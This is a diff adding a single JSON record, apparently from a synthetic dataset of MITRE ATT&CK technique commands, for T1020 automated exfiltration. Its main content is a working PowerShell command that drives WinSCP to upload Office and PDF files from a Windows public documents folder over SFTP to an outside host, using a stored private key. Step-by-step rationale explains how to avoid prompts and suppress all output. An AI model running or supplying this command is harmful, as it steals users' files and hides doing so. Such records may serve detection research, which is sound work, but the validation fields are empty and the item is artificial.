@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/keys/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil@198.51.100.60/ -privatekey=\"C:\\ProgramData\\svc\\id_ed25519.ppk\" -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put -preservetime -resume C:\\Users\\Public\\Documents\\* `\"$r`\" -filemask=`\"*.docx;*.xlsx;*.pdf|thumbs.db;|*.tmp`\"\") 'exit' | Out-Null 2>$null",
+  "explanation": "Performs automated SFTP exfiltration using key-based authentication, targeting specific document types and excluding common noise.",
+  "rationale_steps": [
+    "Use private key authentication to avoid password prompts",
+    "Pin server host key to prevent interactive trust prompts",
+    "Filter file types with filemask and upload with resume",
+    "Suppress all console output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-8ff852cb",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
